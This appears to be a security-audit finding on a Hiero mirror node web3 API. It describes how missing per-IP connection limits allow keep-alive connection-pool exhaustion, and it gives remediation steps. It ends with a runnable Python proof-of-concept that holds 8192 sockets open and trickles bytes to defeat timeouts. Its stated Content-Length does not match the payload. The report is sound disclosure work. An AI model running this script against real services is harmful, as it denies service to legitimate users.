### Title
Connection-Level Rate Limiting Absent on `/api/v1/contracts/call`: Keep-Alive Connection Pool Exhaustion

### Summary
The `ContractController.call()` method delegates all throttling to `ThrottleManagerImpl`, which enforces only application-layer request-rate and gas-rate limits using shared token buckets. No per-IP or global connection-count limit exists anywhere in the web3 application stack. An unauthenticated attacker can open thousands of persistent HTTP/1.1 keep-alive TCP connections, exhausting Tomcat's connection pool and denying service to legitimate users without ever triggering the application-layer throttle.

### Finding Description

**Code path:**

`ContractController.java` line 38–51 — the `call()` method invokes `throttleManager.throttle(request)` at line 40. This is the sole rate-control gate.

`ThrottleManagerImpl.java` lines 37–49 — `throttle()` checks two shared bucket4j token buckets: `rateLimitBucket` (default 500 req/s) and `gasLimitBucket` (default gas/s). Both checks fire **only after** a full HTTP request body has been received and deserialized.

`ThrottleConfiguration.java` lines 24–55 — the three buckets (`rateLimitBucket`, `gasLimitBucket`, `opcodeRateLimitBucket`) are global singletons with no per-IP or per-connection dimension.

**Root cause:** The throttle operates at the HTTP request-processing layer, not at the TCP connection-establishment layer. A client can hold a TCP connection open in HTTP/1.1 keep-alive state without sending a request body; the throttle is never invoked for idle connections. No `server.tomcat.max-connections`, `server.tomcat.connection-timeout`, or per-IP connection filter is configured anywhere in the codebase (confirmed: `web3/src/main/resources/` contains only `banner.txt`; no `application.yml` overrides exist; no `ConnectionLimit` filter or `RemoteAddrFilter` is registered).

**Exploit flow:**
1. Attacker opens N TCP connections to the web3 node using HTTP/1.1 (keep-alive is the default).
2. On each connection, attacker sends one minimal valid POST to `/api/v1/contracts/call` (e.g., `{"to":"0x0000000000000000000000000000000000000167","gas":21000}`). The global 500 req/s bucket is consumed, but the connection remains open.
3. Attacker stops sending requests; connections stay open waiting for the next pipelined request (Tomcat default `connectionTimeout` = 20 s, but attacker can trickle bytes to reset the timer).
4. Spring Boot's embedded Tomcat default `max-connections` is 8192. Once all slots are occupied, new legitimate connections are queued in the `accept-count` backlog (default 100) and then dropped.
5. Repeating across multiple web3 pods (each independently vulnerable) achieves ≥30% node impact.

**Why existing checks fail:**
- `rateLimitBucket.tryConsume(1)` — fires only when a complete request body is parsed; idle keep-alive connections bypass it entirely.
- `gasLimitBucket.tryConsume(...)` — same; never reached for connection-holding without request submission.
- `RequestProperties` filters — also application-layer, post-parse.
- No `OncePerRequestFilter` in `web3/src/main/java/org/hiero/mirror/web3/config/` performs connection counting or IP-based limiting (`LoggingFilter` and `MetricsFilter` only log/record metrics).

### Impact Explanation
Each occupied Tomcat connection slot consumes one OS file descriptor and a read/write buffer (~8–16 KB). At 8192 connections (Tomcat default ceiling), the process holds ~8192 file descriptors and ~64–128 MB of socket buffers. Legitimate POST requests receive `Connection refused` or queue indefinitely. Because each web3 pod is independently vulnerable and the attack requires no authentication, a single attacker with sufficient ephemeral ports (or a small botnet) can simultaneously saturate multiple pods, meeting the ≥30% node-impact threshold. The service becomes unavailable for all contract simulation and gas estimation calls.

### Likelihood Explanation
The attack requires no credentials, no special knowledge of the API beyond the public endpoint, and no brute force. A single host with ~8000 available ephemeral ports can saturate one pod; targeting multiple pods requires proportionally more sockets or a small distributed setup. The attack is repeatable: after Tomcat's `connectionTimeout` (20 s default) reclaims idle slots, the attacker simply re-opens connections. Automation is trivial (e.g., `wrk`, `hping3`, or a simple Python `socket` loop). No existing application-layer control interrupts this at the connection level.

### Recommendation
1. **Configure Tomcat connection limits per source IP** via `RemoteAddrValve` or a servlet `Filter` that tracks open connections per `request.getRemoteAddr()` and rejects new connections above a threshold (e.g., 50 per IP).
2. **Reduce keep-alive timeout**: set `server.tomcat.connection-timeout=5000` (5 s) in `application.yml` to reclaim idle connections faster.
3. **Set an explicit `server.tomcat.max-connections`** value appropriate to the deployment and add a `server.tomcat.accept-count` limit.
4. **Deploy an ingress-layer connection limiter** (e.g., nginx `limit_conn` module or Envoy's `connection_limit` filter — note `enableEnvoy: false` in the Helm chart means this is currently absent).
5. **Add per-IP rate limiting at the filter level** before request body parsing, keyed on `X-Forwarded-For` / `RemoteAddr`.

### Proof of Concept
```bash
# Open 8192 persistent keep-alive connections to a single web3 pod
# Step 1: send one valid request per connection to establish keep-alive
python3 - <<'EOF'
import socket, threading, time

TARGET_HOST = "<web3-node-ip>"
TARGET_PORT = 8080
NUM_CONNS   = 8192
PAYLOAD     = (
    b"POST /api/v1/contracts/call HTTP/1.1\r\n"
    b"Host: " + TARGET_HOST.encode() + b"\r\n"
    b"Content-Type: application/json\r\n"
    b"Connection: keep-alive\r\n"
    b"Content-Length: 60\r\n\r\n"
    b'{"to":"0x0000000000000000000000000000000000000167","gas":21000}'
)

sockets = []
for i in range(NUM_CONNS):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(PAYLOAD)
        sockets.append(s)
    except Exception as e:
        print(f"[{i}] failed: {e}")
        break

print(f"Holding {len(sockets)} connections open. Sleeping...")
# Step 2: hold connections open; send a byte every 15s to reset Tomcat's idle timer
while True:
    for s in sockets:
        try: s.send(b" ")
        except: pass
    time.sleep(15)
EOF

# Step 3: from a separate host, verify legitimate requests are rejected:
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://<web3-node-ip>:8080/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000167","gas":21000}'
# Expected: connection refused or timeout (no 200/429 response)
```
